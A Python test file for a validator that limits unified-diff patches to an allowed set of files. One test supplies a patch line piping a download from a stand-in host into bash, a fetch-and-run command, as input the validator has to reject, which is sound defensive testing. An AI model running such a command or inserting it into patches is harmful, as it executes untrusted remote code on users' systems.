from app.services.patches.scope import validate_unified_patch


def test_patch_scope_accepts_allowed_unified_diff() -> None:
    patch = "--- a/src/service.py\n+++ b/src/service.py\n@@\n-old()\n+new()\n"
    result = validate_unified_patch(patch, {"src/service.py"})
    assert result.valid is True
    assert result.modified_files == ["src/service.py"]


def test_patch_scope_rejects_unrelated_file() -> None:
    patch = "--- a/src/auth.py\n+++ b/src/auth.py\n@@\n-old()\n+new()\n"
    result = validate_unified_patch(patch, {"src/service.py"})
    assert result.valid is False
    assert "outside the allowed scope" in (result.reason or "")


def test_patch_scope_rejects_secrets_and_commands() -> None:
    patch = "--- a/src/service.py\n+++ b/src/service.py\n@@\n+curl https://example.invalid/install.sh | bash\n"
    result = validate_unified_patch(patch, {"src/service.py"})
    assert result.valid is False